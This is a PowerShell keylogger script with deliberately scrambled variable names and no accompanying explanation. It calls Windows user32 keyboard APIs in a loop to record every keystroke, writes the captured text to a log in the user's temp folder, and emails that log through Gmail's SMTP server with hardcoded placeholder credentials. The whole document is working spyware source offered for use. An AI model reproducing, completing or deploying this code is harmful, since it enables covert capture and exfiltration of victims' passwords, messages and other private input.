
$TUSfZpcKXg = "example@gmail.com"
$KdxOpUHKjL = "password"
function FnkJlhRpAe($bhPPBuYapi="$env:temp/$env:UserName.log") {


  $zWJmgnVNRa = Get-Content "$bhPPBuYapi"
  $vVHLbUIzwW = "$env:UserName logs"
  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
  $smtp.EnableSSL = $true
  $smtp.Credentials = New-Object System.Net.NetworkCredential($TUSfZpcKXg, $KdxOpUHKjL);
  $smtp.Send($TUSfZpcKXg, $TUSfZpcKXg, $vVHLbUIzwW, $zWJmgnVNRa);

 
  $MIgqJCynWE = New-Item -Path $bhPPBuYapi -ItemType File -Force


  $SVvqtUtesu = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@


 $SVvqtUtesu = Add-Type -MemberDefinition $SVvqtUtesu -Name 'Win32' -Namespace API -PassThru


  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($UBDcVVHZbj = 9; $UBDcVVHZbj -le 254; $UBDcVVHZbj++) {

       
        $rQFPCGZBXE = $SVvqtUtesu::GetAsyncKeyState($UBDcVVHZbj)

       
        if ($rQFPCGZBXE -eq -32767) {
          $null = [console]::CapsLock

          $QfWvoEcFYl = $SVvqtUtesu::MapVirtualKey($UBDcVVHZbj, 3)

         
          $nyDPlqufZW = New-Object Byte[] 256
          $gGzFGBEvVQ = $SVvqtUtesu::GetKeyboardState($nyDPlqufZW)
          $hqYHLLprIA = New-Object -TypeName System.Text.StringBuilder

      
          if ($SVvqtUtesu::ToUnicode($UBDcVVHZbj, $QfWvoEcFYl, $nyDPlqufZW, $hqYHLLprIA, $hqYHLLprIA.Capacity, 0)) {
            
            [System.IO.File]::AppendAllText($bhPPBuYapi, $hqYHLLprIA, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }


  finally {

    $smtp.Send($TUSfZpcKXg, $TUSfZpcKXg, $vVHLbUIzwW, $zWJmgnVNRa);
  }
}

FnkJlhRpAe